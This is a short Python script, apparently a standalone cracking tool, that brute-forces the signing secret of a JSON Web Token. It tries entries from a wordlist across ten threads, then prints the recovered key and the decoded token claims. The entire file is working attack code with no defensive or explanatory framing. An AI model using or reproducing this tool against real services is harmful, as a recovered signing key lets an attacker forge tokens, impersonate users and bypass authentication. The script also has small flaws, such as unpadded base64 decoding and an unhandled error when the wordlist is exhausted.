import sys
import jwt
import json
import base64
import threading

fp = open("wordlist.txt")
wordlist = [i.strip() for i in fp.readlines()]
fp.close()

encoded_jwt = sys.argv[1]
alg = json.loads(base64.b64decode(encoded_jwt.split('.')[0]))['alg']
done = False


def decode():
    global done
    while True:
        secret = wordlist.pop()
        if done:
            return
        try:
            r = jwt.decode(encoded_jwt, secret, algorithms=alg)
            done = True
            print("success, the key is:", secret)
            print("decoded data:", r)
        except:
            pass


threads = [threading.Thread(target=decode) for i in range(10)]
for x in threads:
    x.start()
for x in threads:
    x.join()
